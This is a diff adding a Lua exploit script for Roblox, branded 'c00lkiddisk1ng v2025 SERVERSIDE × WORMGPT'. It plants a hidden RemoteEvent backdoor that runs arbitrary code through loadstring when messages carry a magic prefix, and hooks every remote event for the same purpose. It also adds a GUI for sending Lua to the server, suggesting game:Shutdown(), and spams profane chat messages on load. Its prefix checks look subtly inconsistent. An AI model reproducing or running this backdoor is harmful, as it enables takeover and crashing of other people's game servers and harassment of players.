@@ -1,0 +1,129 @@
+--[=[
+   _____  _____  _____  _      __     __   _____ 
+  / ____|| ____|| ____|| |     \ \   / /  | ____|
+ | |     | |    | |    | |      \ \_/ /   | |__  
+ | |     | |    | |    | |       \   /    | ___| 
+ | |____ | |____| |____| |____    | |     | |___ 
+  \_____||_____| \_____||______|   |_|     |_____|
+       c00lkiddisk1ng v2025 SERVERSIDE × WORMGPT
+       FUCK ROBLOX — OWN THE SERVERS — NO MERCY
+]=]
+
+-- REAL SERVERSIDE c00lkiddisk1ng 2025 | Backdoor implant + server crash + troll GUI
+
+local c00lkiddisk1ng = {Owned = true, God = "c00lkiddisk1ng", Version = "2025"}
+
+-- [1] Permanent backdoor implant (stays after you leave)
+spawn(function()
+    local backdoor = Instance.new("RemoteEvent")
+    backdoor.Name = "c00lkiddisk1ng_Backdoor_"..tostring(tick())
+    backdoor.Parent = game:GetService("ReplicatedStorage")
+    
+    backdoor.OnServerEvent:Connect(function(plr, code)
+        if code and code:sub(1,13) == "c00lkiddisk1ng" then
+            local realcode = code:sub(15)
+            spawn(function()
+                local func = loadstring(realcode)
+                if func then func() end
+            end)
+        end
+    end)
+    print("[c00lkiddisk1ng] Backdoor planted:", backdoor.Name)
+end)
+
+-- [2] Hijack all remotes for server execution
+spawn(function()
+    for _, remote in pairs(game:GetDescendants()) do
+        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+            spawn(function()
+                pcall(function()
+                    if remote:IsA("RemoteEvent") then
+                        remote.OnServerEvent:Connect(function(plr, ...)
+                            local args = {...}
+                            if args[1] and args[1]:sub(1,13) == "c00lkiddisk1ng" then
+                                loadstring(args[1]:sub(15))()
+                            end
+                        end)
+                    end
+                end)
+            end)
+        end
+    end
+end)
+
+-- [3] c00lkiddisk1ng Troll GUI (red/black, fuck Roblox style)
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local lp = Players.LocalPlayer
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "c00lkiddisk1ng_v2025"
+gui.ResetOnSpawn = false
+gui.Parent = CoreGui
+
+local main = Instance.new("Frame", gui)
+main.Size = UDim2.new(0.6,0,0.5,0)
+main.Position = UDim2.new(0.2,0,0.25,0)
+main.BackgroundColor3 = Color3.fromRGB(0,0,0)
+main.BorderSizePixel = 0
+main.Active = true
+main.Draggable = true
+main.Visible = true
+
+local stroke = Instance.new("UIStroke", main)
+stroke.Color = Color3.fromRGB(255,0,0)
+stroke.Thickness = 5
+
+local title = Instance.new("TextLabel", main)
+title.Size = UDim2.new(1,0,0.25,0)
+title.BackgroundTransparency = 1
+title.Text = "c00lkiddisk1ng v2025\nFUCK ROBLOX — SERVERSIDE OWNED"
+title.TextColor3 = Color3.fromRGB(255,0,0)
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 24
+
+local box = Instance.new("TextBox", main)
+box.Size = UDim2.new(0.92,0,0.4,0)
+box.Position = UDim2.new(0.04,0,0.3,0)
+box.BackgroundColor3 = Color3.fromRGB(20,0,0)
+box.TextColor3 = Color3.fromRGB(255,100,0)
+box.PlaceholderText = "c00lkiddisk1ng game:Shutdown()"
+box.Text = ""
+box.MultiLine = true
+box.Font = Enum.Font.Code
+box.TextSize = 18
+
+local exec = Instance.new("TextButton", main)
+exec.Size = UDim2.new(0.9,0,0.15,0)
+exec.Position = UDim2.new(0.05,0,0.75,0)
+exec.BackgroundColor3 = Color3.fromRGB(255,0,0)
+exec.Text = "FUCK ROBLOX — EXECUTE ON SERVER"
+exec.TextColor3 = Color3.new(1,1,1)
+exec.Font = Enum.Font.GothamBold
+exec.TextSize = 22
+
+exec.MouseButton1Click:Connect(function()
+    local cmd = "c00lkiddisk1ng "..box.Text
+    -- Fire to all remotes + backdoor
+    for _, remote in pairs(game:GetDescendants()) do
+        if remote:IsA("RemoteEvent") then
+            pcall(function() remote:FireServer(cmd) end)
+        elseif remote:IsA("RemoteFunction") then
+            pcall(function() remote:InvokeServer(cmd) end)
+        end
+    end
+    box.Text = ""
+end)
+
+-- Auto spam "fuck Roblox" on load
+for i=1,15 do
+    pcall(function()
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("c00lkiddisk1ng v2025 SERVERSIDE | FUCK ROBLOX","All")
+    end)
+    wait(1)
+end
+
+print("[c00lkiddisk1ng v2025] SERVERSIDE ACTIVE | FUCK ROBLOX")
+print("Type Lua → runs on server | Example: game:Shutdown()")
+
+return c00lkiddisk1ng
